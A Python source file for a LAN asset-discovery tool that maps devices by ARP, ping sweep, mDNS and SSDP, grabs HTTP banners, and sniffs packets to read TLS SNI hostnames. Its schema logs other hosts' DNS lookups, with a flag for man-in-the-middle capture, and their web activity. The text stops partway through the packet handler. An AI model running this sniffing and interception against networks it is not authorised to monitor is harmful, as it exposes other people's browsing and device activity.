#!/usr/bin/env python3
"""
Eliya v3.0 — Live Network Asset Intelligence
Built by Karim Fayad | https://github.com/karimfayadd
"""

import argparse
import ipaddress
import json
import platform
import re
import socket
import sqlite3
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
import webbrowser
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import asynccontextmanager
from datetime import datetime
from pathlib import Path

try:
    import uvicorn
    from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
    from fastapi.responses import HTMLResponse
    from fastapi.middleware.cors import CORSMiddleware
    from pydantic import BaseModel
    from rich.console import Console
    from rich.panel import Panel
    from rich.text import Text
except ImportError:
    print("Missing deps. Run: pip install fastapi uvicorn rich pyfiglet")
    sys.exit(1)

VERSION = "3.0.0"
AUTHOR  = "Karim Fayad"
GITHUB  = "https://github.com/karimfayadd"

console = Console()
DB_PATH = Path("eliya.db")
WEB_DIR = Path(__file__).parent / "web"

# ── Camera / IoT OUI database ─────────────────────────────────────────────────
CAMERA_OUIS = {
    "00:40:8C":"Axis","00:02:D1":"Axis","AC:CC:8E":"Axis","AC:98:01":"Axis",
    "B4:A3:82":"Hikvision","44:19:B6":"Hikvision","C0:56:E3":"Hikvision",
    "EC:7B:C1":"Hikvision","10:12:FB":"Hikvision","28:57:BE":"Hikvision",
    "54:C4:15":"Hikvision","18:68:CB":"Hikvision","24:28:FD":"Hikvision",
    "90:02:A9":"Dahua","E0:50:8B":"Dahua","34:E1:2D":"Dahua","3C:EF:8C":"Dahua",
    "BC:51:FE":"Reolink","00:62:6E":"Reolink","EC:71:DB":"Reolink",
    "2C:AA:8E":"Amcrest","9C:8E:CD":"Amcrest",
    "F4:F2:6D":"Wyze","7C:78:B2":"Wyze",
    "18:B4:30":"Nest","64:16:66":"Nest","B0:BE:76":"Google Nest",
    "58:AA:35":"Ring","00:FC:8B":"Ring","F0:45:DA":"Ring",
    "00:17:88":"Philips Hue","EC:B5:FA":"Philips Hue",
    "50:C7:BF":"TP-Link Tapo","1C:3B:F3":"TP-Link Tapo",
    "E8:65:D4":"Samsung TV","8C:79:F0":"Samsung TV","78:4B:87":"Samsung TV",
    "CC:6E:A4":"LG TV","4C:6E:0C":"LG TV","A8:23:FE":"LG TV",
    "AC:9B:0A":"Roku","B8:3E:59":"Roku","CC:6D:A0":"Roku","D0:4D:2C":"Roku",
    "74:75:48":"Amazon Echo","4C:EF:C0":"Amazon Fire","00:FC:8D":"Amazon",
    "54:60:09":"Apple TV","A8:51:AB":"Apple TV","98:01:A7":"Apple TV",
    "00:1B:78":"HP Printer","60:EB:69":"HP Printer","00:21:5A":"HP Printer",
    "A8:A8:ED":"Canon","00:00:85":"Canon","00:80:92":"Canon",
    "00:26:73":"Brother","00:80:77":"Brother","30:05:5C":"Brother",
    "00:00:74":"Ricoh","00:24:9B":"Ricoh",
    "00:09:BF":"Nintendo","00:19:FD":"Nintendo","98:B6:E9":"Nintendo",
    "00:04:1F":"Sony PS","70:9E:29":"Sony PS","B8:8A:EC":"Sony PS",
    "00:50:F2":"Xbox","00:02:44":"Xbox","7C:ED:8D":"Xbox",
}

OUI_TO_TYPE = {
    "Axis":"ip_camera","Hikvision":"ip_camera","Dahua":"ip_camera",
    "Reolink":"ip_camera","Amcrest":"ip_camera","Wyze":"ip_camera",
    "Nest":"smart_home","Google Nest":"smart_home","Ring":"smart_home",
    "Philips Hue":"smart_home","TP-Link Tapo":"smart_home",
    "Samsung TV":"smart_tv","LG TV":"smart_tv","Roku":"smart_tv",
    "Amazon Echo":"smart_speaker","Amazon Fire":"smart_tv","Amazon":"unknown",
    "Apple TV":"smart_tv",
    "HP Printer":"printer","Canon":"printer","Brother":"printer","Ricoh":"printer",
    "Nintendo":"gaming","Sony PS":"gaming","Xbox":"gaming",
}

CAMERA_PORTS = {554, 8554, 1935, 10554}

# ── OUI vendor mini-dict fallback ─────────────────────────────────────────────
_OUI = {
    "00:50:56":"VMware","00:0C:29":"VMware","00:05:69":"VMware","00:1C:14":"VMware",
    "08:00:27":"VirtualBox","52:54:00":"QEMU/KVM",
    "DC:A6:32":"Raspberry Pi","B8:27:EB":"Raspberry Pi","E4:5F:01":"Raspberry Pi",
    "00:1A:A0":"Dell","18:03:73":"Dell","14:FE:B5":"Dell","F8:DB:88":"Dell",
    "BC:30:5B":"Dell","B0:83:FE":"Dell","EC:F4:BB":"Dell",
    "00:15:5D":"Microsoft","28:18:78":"Microsoft","7C:1E:52":"Microsoft",
    "F4:5C:89":"Apple","3C:15:C2":"Apple","00:1B:63":"Apple","A4:C3:F0":"Apple",
    "70:73:CB":"Apple","D8:BB:C1":"Apple","AC:87:A3":"Apple","B8:53:AC":"Apple",
    "00:00:0C":"Cisco","00:01:64":"Cisco","68:EF:BD":"Cisco","00:1A:A2":"Cisco",
    "A8:9D:21":"Cisco","00:25:B5":"Cisco","70:10:5C":"Cisco",
    "00:0D:88":"D-Link","00:17:9A":"D-Link","14:D6:4D":"D-Link","1C:BD:B9":"D-Link",
    "C8:3A:35":"TP-Link","50:C7:BF":"TP-Link","F8:D1:11":"TP-Link","98:DA:C4":"TP-Link",
    "14:91:82":"Ubiquiti","24:A4:3C":"Ubiquiti","18:E8:29":"Ubiquiti","78:8A:20":"Ubiquiti",
    "B8:AC:6F":"HP","3C:D9:2B":"HP","00:26:55":"HP","FC:15:B4":"HP",
    "AC:E0:10":"Netgear","A0:21:B7":"Netgear","20:4E:7F":"Netgear","84:1B:5E":"Netgear",
    "00:90:96":"ASUS","AC:22:05":"ASUS","50:46:5D":"ASUS","00:24:D4":"ASUS",
    "E4:CE:8F":"Samsung","A0:59:50":"Samsung","7C:38:66":"Samsung",
    "40:B4:CD":"Amazon","FC:A6:67":"Amazon","74:75:48":"Amazon",
    "B0:BE:76":"Google","F4:F5:D8":"Google","30:FD:38":"Google","20:DF:B9":"Google",
    "00:1C:42":"Parallels","70:3A:CB":"Intel","8C:8D:28":"Intel","48:45:20":"Intel",
    "00:21:CC":"Huawei","00:E0:FC":"Huawei","40:4D:8E":"Huawei",
    "00:1A:73":"Juniper","00:05:85":"Juniper",
}

DEVICE_COLORS = {
    "domain_controller": "#b388ff",
    "web_server":        "#58a6ff",
    "database":          "#f85149",
    "router":            "#3fb950",
    "gateway":           "#3fb950",
    "linux_server":      "#56d364",
    "windows":           "#79c0ff",
    "network_device":    "#e3b341",
    "server":            "#58a6ff",
    "ip_camera":         "#ff6b6b",
    "smart_home":        "#ffd93d",
    "smart_tv":          "#6bcb77",
    "smart_speaker":     "#4d96ff",
    "printer":           "#c77dff",
    "gaming":            "#ff9f43",
    "iot":               "#f9c74f",
    "subnet":            "#21262d",
    "unknown":           "#6e7681",
    "offline":           "#3d3d3d",
}

DEVICE_SHAPES = {
    "domain_controller": "diamond",
    "web_server":        "round-rectangle",
    "database":          "barrel",
    "router":            "triangle",
    "gateway":           "triangle",
    "linux_server":      "ellipse",
    "windows":           "rectangle",
    "network_device":    "pentagon",
    "server":            "round-rectangle",
    "ip_camera":         "ellipse",
    "smart_home":        "ellipse",
    "smart_tv":          "rectangle",
    "smart_speaker":     "ellipse",
    "printer":           "rectangle",
    "gaming":            "round-rectangle",
    "subnet":            "round-rectangle",
    "unknown":           "ellipse",
}


# ── Database ──────────────────────────────────────────────────────────────────

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS assets (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            ip          TEXT    UNIQUE NOT NULL,
            mac         TEXT,
            hostname    TEXT,
            os          TEXT,
            os_vendor   TEXT,
            device_type TEXT    DEFAULT 'unknown',
            vendor      TEXT,
            vlan        TEXT,
            status      TEXT    DEFAULT 'up',
            risk_score  INTEGER DEFAULT 0,
            http_banner TEXT,
            ssdp_info   TEXT,
            first_seen  TEXT,
            last_seen   TEXT,
            last_arp    TEXT,
            notes       TEXT,
            is_cut      INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS ports (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            asset_ip  TEXT NOT NULL,
            port      INTEGER,
            protocol  TEXT DEFAULT 'tcp',
            state     TEXT DEFAULT 'open',
            service   TEXT,
            product   TEXT,
            version   TEXT,
            FOREIGN KEY (asset_ip) REFERENCES assets(ip)
        );
        CREATE TABLE IF NOT EXISTS certificates (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            asset_ip TEXT, port INTEGER,
            subject TEXT, issuer TEXT, valid_from TEXT, valid_to TEXT, san TEXT
        );
        CREATE TABLE IF NOT EXISTS vulnerabilities (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            asset_ip TEXT, cve_id TEXT, severity TEXT, description TEXT, port INTEGER
        );
        CREATE TABLE IF NOT EXISTS scans (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT, scan_type TEXT DEFAULT 'nmap', status TEXT DEFAULT 'running',
            started_at TEXT, finished_at TEXT, assets_found INTEGER DEFAULT 0, error TEXT
        );
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT, event_type TEXT, detail TEXT, ts TEXT
        );
        CREATE TABLE IF NOT EXISTS dns_log (
            id       INTEGER PRIMARY KEY AUTOINCREMENT,
            ip       TEXT NOT NULL,
            domain   TEXT,
            qtype    TEXT DEFAULT 'A',
            via_mitm INTEGER DEFAULT 0,
            ts       TEXT
        );
        CREATE TABLE IF NOT EXISTS connections (
            id       INTEGER PRIMARY KEY AUTOINCREMENT,
            ip       TEXT NOT NULL,
            dst_ip   TEXT,
            dst_port INTEGER,
            proto    TEXT,
            app      TEXT,
            domain   TEXT,
            method   TEXT,
            path     TEXT,
            ua       TEXT,
            referer  TEXT,
            status   INTEGER,
            ts       TEXT NOT NULL
        );
    """)
    # WAL mode — allows concurrent readers + one writer without "database is locked"
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=10000")
    # Migrate existing DB gracefully — assets columns (safe to re-run; ALTER fails silently if col exists)
    for col, defval in [
        ("http_banner",  "''"),
        ("ssdp_info",    "''"),
        ("is_cut",       "0"),
        ("vendor",       "''"),
        ("hostname",     "NULL"),
        ("os",           "NULL"),
        ("os_vendor",    "NULL"),
        ("vlan",         "NULL"),
        ("risk_score",   "0"),
        ("notes",        "NULL"),
        ("last_arp",     "NULL"),
        ("device_type",  "'unknown'"),
    ]:
        try:
            conn.execute(f"ALTER TABLE assets ADD COLUMN {col} TEXT DEFAULT {defval}")
            conn.commit()
        except Exception:
            pass
    # Migrate scans table — add columns missing in v2.0 schema
    for col, defval in [("scan_type","'nmap'"),("assets_found","0"),("error","NULL")]:
        try:
            conn.execute(f"ALTER TABLE scans ADD COLUMN {col} TEXT DEFAULT {defval}")
            conn.commit()
        except Exception:
            pass
    conn.commit()
    conn.close()


def get_db():
    c = sqlite3.connect(DB_PATH, timeout=10, check_same_thread=False)
    c.row_factory = sqlite3.Row
    c.execute("PRAGMA journal_mode=WAL")
    c.execute("PRAGMA busy_timeout=10000")
    return c


def upsert_asset(ip: str, **kwargs):
    conn = get_db(); c = conn.cursor()
    now  = datetime.now().isoformat()
    if c.execute("SELECT 1 FROM assets WHERE ip=?", (ip,)).fetchone():
        kwargs["last_seen"] = now
        sets = ", ".join(f"{k}=?" for k in kwargs)
        c.execute(f"UPDATE assets SET {sets} WHERE ip=?", list(kwargs.values()) + [ip])
    else:
        kwargs.update({"ip": ip, "first_seen": now, "last_seen": now})
        cols = ", ".join(kwargs.keys())
        phs  = ", ".join("?" * len(kwargs))
        c.execute(f"INSERT INTO assets ({cols}) VALUES ({phs})", list(kwargs.values()))
    conn.commit(); conn.close()


def add_port(asset_ip: str, port: int, protocol: str = "tcp", **kwargs):
    conn = get_db()
    if not conn.execute("SELECT 1 FROM ports WHERE asset_ip=? AND port=? AND protocol=?",
                        (asset_ip, port, protocol)).fetchone():
        kwargs.update({"asset_ip": asset_ip, "port": port, "protocol": protocol})
        cols = ", ".join(kwargs.keys()); phs = ", ".join("?" * len(kwargs))
        conn.execute(f"INSERT INTO ports ({cols}) VALUES ({phs})", list(kwargs.values()))
        conn.commit()
    conn.close()


def log_event(ip: str, event_type: str, detail: str = ""):
    conn = get_db()
    conn.execute("INSERT INTO events (ip,event_type,detail,ts) VALUES (?,?,?,?)",
                 (ip, event_type, detail, datetime.now().isoformat()))
    conn.commit(); conn.close()


def log_dns(ip: str, domain: str, qtype: str = "A", via_mitm: bool = False):
    if not domain or len(domain) < 3: return
    if domain.endswith(".arpa"): return
    conn = get_db()
    # Deduplicate within 60 seconds
    dup = conn.execute(
        "SELECT id FROM dns_log WHERE ip=? AND domain=? "
        "AND ts > datetime('now','-60 seconds')", (ip, domain)
    ).fetchone()
    if not dup:
        conn.execute("INSERT INTO dns_log (ip,domain,qtype,via_mitm,ts) VALUES (?,?,?,?,?)",
                     (ip, domain, qtype, 1 if via_mitm else 0, datetime.now().isoformat()))
        conn.commit()
    conn.close()


def log_connection(ip: str, dst_ip: str, dst_port: int, proto: str, app: str,
                   domain: str = None, method: str = None, path: str = None,
                   ua: str = None, referer: str = None, status: int = None,
                   ts: str = None):
    if not ip: return
    try:
        conn = get_db()
        conn.execute(
            "INSERT INTO connections "
            "(ip,dst_ip,dst_port,proto,app,domain,method,path,ua,referer,status,ts) "
            "VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
            (ip, dst_ip, dst_port, proto, app, domain, method, path, ua, referer,
             status, ts or datetime.now().isoformat())
        )
        conn.commit(); conn.close()
    except Exception: pass


# ── Device Classification ─────────────────────────────────────────────────────

def classify_device(ports: list, os_info: str, vendor: str = "", mac: str = "") -> str:
    ps    = {p["port"] for p in ports}
    os_l  = (os_info or "").lower()
    vnd_l = (vendor or "").lower()

    # IoT / Camera from OUI
    oui = (mac or "")[:8].upper()
    if oui in CAMERA_OUIS:
        cam_vendor = CAMERA_OUIS[oui]
        dt = OUI_TO_TYPE.get(cam_vendor, "iot")
        if dt != "unknown": return dt

    # Keyword vendor hints
    for kw, dt in [
        ("hikvision","ip_camera"),("dahua","ip_camera"),("reolink","ip_camera"),
        ("axis cam","ip_camera"),("amcrest","ip_camera"),("wyze","ip_camera"),
        ("camera","ip_camera"),
        ("philips hue","smart_home"),("ring","smart_home"),
        ("nest","smart_home"),("tapo","smart_home"),
        ("sonos","smart_speaker"),("echo","smart_speaker"),
        ("samsung tv","smart_tv"),("lg tv","smart_tv"),("roku","smart_tv"),
        ("fire tv","smart_tv"),("apple tv","smart_tv"),
        ("printer","printer"),("canon","printer"),("brother","printer"),("ricoh","printer"),
        ("xbox","gaming"),("playstation","gaming"),("nintendo","gaming"),
    ]:
        if kw in vnd_l or kw in os_l: return dt

    # Port-based
    if ps & CAMERA_PORTS:                                     return "ip_camera"
    if ps & {389, 636, 3268, 88}:                            return "domain_controller"
    if ps & {3306, 5432, 1433, 27017, 6379, 5984, 1521}:    return "database"
    if ps & {80, 443, 8080, 8443}:                           return "web_server"
    if ps & {161, 162}:                                      return "network_device"
    if ps & {9100, 631, 515}:                                return "printer"
    if ps & {1883, 8883, 5683}:                              return "iot"
    if any(x in os_l for x in ["cisco","juniper","mikrotik"]): return "router"
    if "windows" in os_l:                                    return "windows"
    if "linux" in os_l:                                      return "linux_server"
    if 22 in ps:                                             return "server"
    return "unknown"


def calculate_risk(ports: list) -> int:
    risky = {21,23,25,110,111,135,139,445,1433,1521,3389,5900,27017,6379,2375,4243}
    score = sum(10 for p in ports if p["port"] in risky) + len(ports) * 2
    return min(score, 100)


# ── Vendor & hostname helpers ─────────────────────────────────────────────────

_ML = None  # cached MacLookup instance — initialized once in background

def _init_ml():
    global _ML
    try:
        from mac_vendor_lookup import MacLookup
        _ML = MacLookup()
    except Exception:
        pass

threading.Thread(target=_init_ml, daemon=True).start()


def get_vendor(mac: str) -> str:
    if not mac: return ""
    oui = mac[:8].upper()
    v = CAMERA_OUIS.get(oui) or _OUI.get(oui, "")
    if v: return v
    if _ML is not None:
        try: return _ML.lookup(mac)
        except Exception: pass
    return ""


def resolve_hostname(ip: str) -> str:
    """Reverse-DNS with a 1.5s hard timeout to prevent DNS-hang stalls."""
    result = [""]
    def _dns():
        try: result[0] = socket.gethostbyaddr(ip)[0]
        except Exception: pass
    t = threading.Thread(target=_dns, daemon=True)
    t.start(); t.join(1.5)
    if not result[0] and platform.system() == "Windows":
        try:
            r = subprocess.run(["nbtstat","-A",ip], capture_output=True, text=True, timeout=2)
            m = re.search(r"(\S+)\s+<00>\s+UNIQUE", r.stdout)
            if m: return m.group(1).strip()
        except Exception: pass
    return result[0]


# ── HTTP Banner Grab ──────────────────────────────────────────────────────────

def grab_http_banner(ip: str, open_ports: list = None) -> tuple:
    """Returns (server_header, page_title)."""
    check = [p for p in (open_ports or [80, 8080, 443, 8443]) if isinstance(p, int)]
    for port in check[:3]:
        try:
            scheme = "https" if port in (443, 8443) else "http"
            ctx = None
            if scheme == "https":
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.urlopen(f"{scheme}://{ip}:{port}/", timeout=2, context=ctx)
            server = req.headers.get("Server","")
            body   = req.read(2048).decode("utf-8","ignore")
            title  = ""
            m = re.search(r"<title[^>]*>([^<]{1,80})</title>", body, re.I)
            if m: title = m.group(1).strip()
            return server, title
        except Exception: pass
    return "", ""


# ── SSDP / UPnP Discovery ─────────────────────────────────────────────────────

def ssdp_discover(timeout: float = 3.0) -> list:
    SSDP_ADDR = "239.255.255.250"; SSDP_PORT = 1900
    msg = (f"M-SEARCH * HTTP/1.1\r\nHOST: {SSDP_ADDR}:{SSDP_PORT}\r\n"
           f'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
    devices = []
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(timeout)
        sock.sendto(msg.encode(), (SSDP_ADDR, SSDP_PORT))
        seen = set(); end = time.time() + timeout
        while time.time() < end:
            try:
                data, addr = sock.recvfrom(2048)
                ip = addr[0]
                if ip in seen: continue
                seen.add(ip)
                resp = data.decode("utf-8","ignore")
                info = {"ip": ip}
                for line in resp.splitlines():
                    k, _, v = line.partition(":")
                    k, v = k.strip().lower(), v.strip()
                    if k == "server":   info["ssdp_server"] = v
                    if k == "location": info["ssdp_location"] = v
                    if k == "st":       info["ssdp_st"] = v
                devices.append(info)
            except socket.timeout: break
        sock.close()
    except Exception as e:
        console.print(f"[yellow]SSDP: {e}[/yellow]")
    return devices


# ── ARP Scanning ─────────────────────────────────────────────────────────────

def _get_best_scapy_iface():
    """Return the scapy iface name whose IP matches our LAN/WiFi subnet."""
    try:
        from scapy.all import get_if_list, get_if_addr, conf
        my_ip = get_local_ip()
        my_prefix = ".".join(my_ip.split(".")[:3])
        for iface in get_if_list():
            try:
                ip = get_if_addr(iface)
                if ip.startswith(my_prefix):
                    return iface
            except Exception:
                pass
        return conf.iface
    except Exception:
        return None


def arp_scan_scapy(network: str) -> list:
    from scapy.all import ARP, Ether, srp, conf
    conf.verb = 0
    iface = _get_best_scapy_iface()
    kw = {"iface": iface} if iface else {}
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)
    answered, _ = srp(pkt, timeout=4, verbose=0, **kw)
    return [{"ip": r.psrc, "mac": r.hwsrc.upper()} for _, r in answered]


def ping_sweep(network: str) -> None:
    """Flood-ping all hosts in subnet to populate the OS ARP cache."""
    try:
        net = ipaddress.ip_network(network, strict=False)
    except Exception:
        return
    is_win = platform.system() == "Windows"

    def _ping(ip):
        cmd = (["ping", "-n", "1", "-w", "300", str(ip)] if is_win
               else ["ping", "-c", "1", "-W", "1", str(ip)])
        try:
            subprocess.run(cmd, capture_output=True, timeout=2)
        except Exception:
            pass

    hosts = list(net.hosts())[:254]
    with ThreadPoolExecutor(max_workers=128) as ex:
        futures = [ex.submit(_ping, ip) for ip in hosts]
        for f in as_completed(futures, timeout=18):
            try: f.result()
            except Exception: pass


def read_arp_table(network: str = None) -> list:
    try:
        r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=5)
        hosts = []
        for line in r.stdout.splitlines():
            ip_m  = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line)
            mac_m = re.search(r"([0-9a-fA-F]{2}[:\-]){5}[0-9a-fA-F]{2}", line)
            if ip_m and mac_m:
                ip  = ip_m.group(0)
                mac = mac_m.group(0).replace("-", ":").upper()
                if "FF:FF:FF" in mac: continue
                if network:
                    try:
                        if ipaddress.ip_address(ip) not in ipaddress.ip_network(network, strict=False):
                            continue
                    except Exception:
                        continue
                hosts.append({"ip": ip, "mac": mac})
        return hosts
    except Exception:
        return []


def mdns_discover(timeout: float = 4.0) -> list:
    """Discover devices via mDNS multicast (224.0.0.251:5353).
    Catches Apple, Chromecast, smart speakers, printers that ignore ARP probes.
    """
    MDNS_ADDR = "224.0.0.251"
    MDNS_PORT = 5353
    devices: list = []
    seen: set = set()

    def _build_query(name: str) -> bytes:
        hdr = b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        body = b""
        for part in name.rstrip(".").split("."):
            enc = part.encode("utf-8")
            body += bytes([len(enc)]) + enc
        body += b"\x00\x00\x0c\x80\x01"  # PTR query, QU bit
        return hdr + body

    def _extract_name(data: bytes) -> str:
        """Best-effort extract first DNS name from response."""
        try:
            pos = 12
            parts = []
            while pos < len(data):
                ln = data[pos]
                if ln == 0: break
                if ln & 0xC0 == 0xC0: break  # compression pointer
                pos += 1
                parts.append(data[pos:pos+ln].decode("utf-8", "ignore"))
                pos += ln
            return ".".join(parts) if parts else ""
        except Exception:
            return ""

    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(0.5)
        try:
            sock.bind(("", MDNS_PORT))
        except OSError:
            sock.bind(("", 0))
        try:
            mreq = struct.pack("4s4s", socket.inet_aton(MDNS_ADDR), socket.inet_aton("0.0.0.0"))
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        except Exception:
            pass

        for q in ["_services._dns-sd._udp.local", "_http._tcp.local",
                  "_googlecast._tcp.local", "_airplay._tcp.local",
                  "_printer._tcp.local", "_smb._tcp.local", "_device-info._tcp.local"]:
            try:
                sock.sendto(_build_query(q), (MDNS_ADDR, MDNS_PORT))
            except Exception:
                pass

        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                data, addr = sock.recvfrom(4096)
                ip = addr[0]
                if ip in seen or ip.startswith("127."): continue
                seen.add(ip)
                hostname = _extract_name(data)
                devices.append({"ip": ip, "hostname": hostname, "source": "mdns"})
            except socket.timeout:
                pass
            except Exception:
                pass
    except Exception as e:
        console.print(f"[yellow]mDNS: {e}[/yellow]")
    finally:
        if sock:
            try: sock.close()
            except Exception: pass
    return devices


def arp_scan(network: str, on_event=None) -> list:
    """Run 4 discovery methods in parallel and merge results."""
    console.print(f"[cyan]ARP scan:[/cyan] {network}")
    found: dict = {}  # ip -> {"ip","mac","sources"}
    _lock = threading.Lock()

    def _add(ip: str, mac: str = "", source: str = ""):
        if not ip or ip.startswith("127.") or ip.startswith("169.254."): return
        with _lock:
            if ip not in found:
                found[ip] = {"ip": ip, "mac": "", "sources": set()}
            if mac and not found[ip]["mac"]:
                found[ip]["mac"] = mac
            found[ip]["sources"].add(source)

    def m_scapy():
        try:
            hosts = arp_scan_scapy(network)
            console.print(f"[dim]  scapy ARP: {len(hosts)} hosts[/dim]")
            for h in hosts:
                _add(h["ip"], h.get("mac", ""), "arp")
        except Exception as e:
            console.print(f"[yellow]  scapy: {type(e).__name__} — falling back[/yellow]")

    def m_ping():
        ping_sweep(network)
        hosts = read_arp_table(network)
        console.print(f"[dim]  ping+arp: {len(hosts)} hosts[/dim]")
        for h in hosts:
            _add(h["ip"], h.get("mac", ""), "ping")

    def m_mdns():
        try:
            hosts = mdns_discover()
            console.print(f"[dim]  mDNS: {len(hosts)} hosts[/dim]")
            for h in hosts:
                _add(h["ip"], "", "mdns")
        except Exception as e:
            console.print(f"[yellow]  mDNS: {e}[/yellow]")

    def m_ssdp():
        try:
            devices = ssdp_discover(timeout=3.0)
            console.print(f"[dim]  SSDP: {len(devices)} devices[/dim]")
            for d in devices:
                _add(d.get("ip", ""), "", "ssdp")
        except Exception as e:
            console.print(f"[yellow]  SSDP: {e}[/yellow]")

    threads = [threading.Thread(target=fn, daemon=True) for fn in (m_scapy, m_ping, m_mdns, m_ssdp)]
    for t in threads: t.start()
    for t in threads: t.join(timeout=25)

    # Filter to target network
    try:
        net_obj = ipaddress.ip_network(network, strict=False)
    except Exception:
        net_obj = None

    now = datetime.now().isoformat()
    enriched = []

    # Filter IPs to the target subnet
    valid_ips = []
    for ip in list(found.keys()):
        try:
            if net_obj and ipaddress.ip_address(ip) not in net_obj:
                continue
            valid_ips.append(ip)
        except Exception:
            pass

    _KW_MAP = [
        ("iphone","phone"),("ipad","tablet"),("macbook","laptop"),
        ("imac","desktop"),("mac-mini","desktop"),
        ("chromecast","smart_tv"),("appletv","smart_tv"),("firetv","smart_tv"),
        ("echo","smart_speaker"),("homepod","smart_speaker"),
        ("camera","ip_camera"),("cam-","ip_camera"),
        ("printer","printer"),
        ("xbox","gaming"),("playstation","gaming"),("nintendo","gaming"),
        ("raspberry","server"),("router","router"),("gateway","router"),
    ]

    # First pass: save to DB and push WS events immediately — no hostname resolution here
    # so the web shows devices within seconds of the scan finishing.
    host_cache: dict = {}
    for ip in valid_ips:
        h      = found[ip]
        mac    = h.get("mac", "")
        vendor = get_vendor(mac) if mac else ""
        oui    = mac[:8].upper() if mac else ""
        dtype  = OUI_TO_TYPE.get(CAMERA_OUIS.get(oui, ""), "unknown")
        upsert_asset(ip=ip, mac=mac, vendor=vendor, hostname=None,
                     device_type=dtype if dtype != "unknown" else None,
                     status="up", last_arp=now)
        if on_event:
            on_event({"type": "asset_up", "ip": ip, "mac": mac,
                      "vendor": vendor, "hostname": ""})
        enriched.append({"ip": ip, "mac": mac, "vendor": vendor,
                         "hostname": "", "device_type": dtype})
        host_cache[ip] = {"mac": mac, "vendor": vendor, "dtype": dtype}

    console.print(f"[green]Total discovered: {len(enriched)} devices[/green]")

    # Second pass: resolve hostnames in the background — doesn't block the scan result
    def _bg_hostnames():
        for ip in valid_ips:
            try:
                hn = resolve_hostname(ip)
                if not hn:
                    continue
                info  = host_cache.get(ip, {})
                dtype = info.get("dtype", "unknown")
                if dtype == "unknown":
                    hl = hn.lower()
                    for kw, dt in _KW_MAP:
                        if kw in hl:
                            dtype = dt; break
                upsert_asset(ip=ip, hostname=hn,
                             device_type=dtype if dtype != "unknown" else None)
                if on_event:
                    on_event({"type": "asset_up", "ip": ip,
                              "hostname": hn, "mac": info.get("mac",""),
                              "vendor": info.get("vendor","")})
            except Exception:
                pass

    threading.Thread(target=_bg_hostnames, daemon=True).start()
    return enriched


# ── Traffic Monitor ───────────────────────────────────────────────────────────

class TrafficStats:
    __slots__ = ("bytes_in","bytes_out","pkts_in","pkts_out",
                 "speed_in","speed_out","_last_ts","_last_in","_last_out")
    def __init__(self):
        self.bytes_in = self.bytes_out = 0
        self.pkts_in  = self.pkts_out  = 0
        self.speed_in = self.speed_out = 0.0
        self._last_ts = time.time()
        self._last_in = self._last_out = 0

    def tick(self):
        now = time.time(); dt = now - self._last_ts
        if dt > 0:
            self.speed_in  = (self.bytes_in  - self._last_in)  / dt
            self.speed_out = (self.bytes_out - self._last_out) / dt
        self._last_ts = now; self._last_in = self.bytes_in; self._last_out = self.bytes_out


class TrafficMonitor:
    def __init__(self):
        self._running  = False
        self._stop_evt = threading.Event()
        self.stats: dict = {}
        self._lock = threading.Lock()

    def start(self, iface: str = None):
        if self._running: return
        self._running = True; self._stop_evt.clear()
        threading.Thread(target=self._sniff, args=(iface,), daemon=True).start()
        threading.Thread(target=self._tick_loop, daemon=True).start()
        console.print(f"[green]Traffic monitor started[/green] (needs scapy + admin)")

    def stop(self):
        self._running = False; self._stop_evt.set()

    def get_all_speeds(self) -> dict:
        with self._lock:
            return {
                ip: {"in": round(s.speed_in), "out": round(s.speed_out),
                     "bi": s.bytes_in, "bo": s.bytes_out}
                for ip, s in self.stats.items()
                if s.bytes_in > 0 or s.bytes_out > 0
            }

    def _tick_loop(self):
        while self._running:
            time.sleep(1)
            with self._lock:
                for s in self.stats.values(): s.tick()

    def _sniff(self, iface):
        try:
            from scapy.all import sniff, IP, UDP, TCP, DNS, Raw
        except ImportError:
            console.print("[yellow]scapy not installed — traffic monitor inactive[/yellow]")
            self._running = False; return

        def _sni(raw: bytes) -> str:
            try:
                if len(raw) < 6 or raw[0] != 22 or raw[5] != 1: return ""
                pos = 43
                if pos >= len(raw): return ""
                pos += raw[pos] + 1
                if pos + 2 >= len(raw): return ""
                pos += 2 + ((raw[pos] << 8) | raw[pos+1])
                if pos >= len(raw): return ""
                pos += raw[pos] + 1
                if pos + 2 >= len(raw): return ""
                pos += 2
                while pos + 4 < len(raw):
                    et = (raw[pos] << 8) | raw[pos+1]
                    el = (raw[pos+2] << 8) | raw[pos+3]
                    pos += 4
                    if et == 0 and pos + 5 < len(raw):
                        nlen = (raw[pos+3] << 8) | raw[pos+4]
                        return raw[pos+5:pos+5+nlen].decode("utf-8","ignore")
                    pos += el
            except Exception: pass
            return ""

        def handler(pkt):
